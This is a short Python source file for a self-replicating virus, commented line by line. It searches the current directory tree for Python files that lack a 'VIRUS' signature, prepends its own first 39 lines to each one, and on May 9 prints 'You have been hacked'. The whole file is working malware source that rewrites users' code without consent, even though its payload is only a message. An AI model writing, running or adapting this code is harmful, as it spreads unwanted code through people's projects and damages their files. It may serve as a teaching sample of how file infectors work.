import os
import datetime

SIGNATURE = "VIRUS"

# Function that looks for all files it can infect
def locate(path):
    # path to store files that can be infected
    files_targeted = []  
    # Get the list of files in the specified path
    filelist = os.listdir(path)  
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            # If path is directory, use function locate on directory
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            # looks for .py files and see if the virus code is in the file
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            # If the file isn't infected, add it to the list of files that should be infected
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

# This function infects the files it found to not be infected
def infect(files_targeted):
    # Open the current file (the virus) in read mode
    virus = open(os.path.abspath(__file__))  
    virusstring = ""
    for i, line in enumerate(virus):
        if 0 <= i < 39:
            # Copy the first 39 lines of the virus file into the 'virusstring'
            virusstring += line
    virus.close  # Close the virus file
    for fname in files_targeted:
        # Open each targeted file and append the contents of the virus string at the beginning
        # Open the targeted file in read mode
        f = open(fname)
        # Read the content of the targeted file
        temp = f.read() 
        # Close the targeted file
        f.close() 
         # Reopen the targeted file in write mode
        f = open(fname, "w")  
        # Write the virus string followed by the original content of the targeted file
        f.write(virusstring + temp)  
        # Close the targeted file after writing the infected content
        f.close()  

# executed function on may 9th
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        # If date is May 9th, print message "You have been hacked"
        print("You have been hacked")

# find files to target for infection in current directory
files_targeted = locate(os.path.abspath(""))
# Infect the targeted files with the virus
infect(files_targeted)
# Execute the payload (print a message) if the current date is May 9th
detonate()
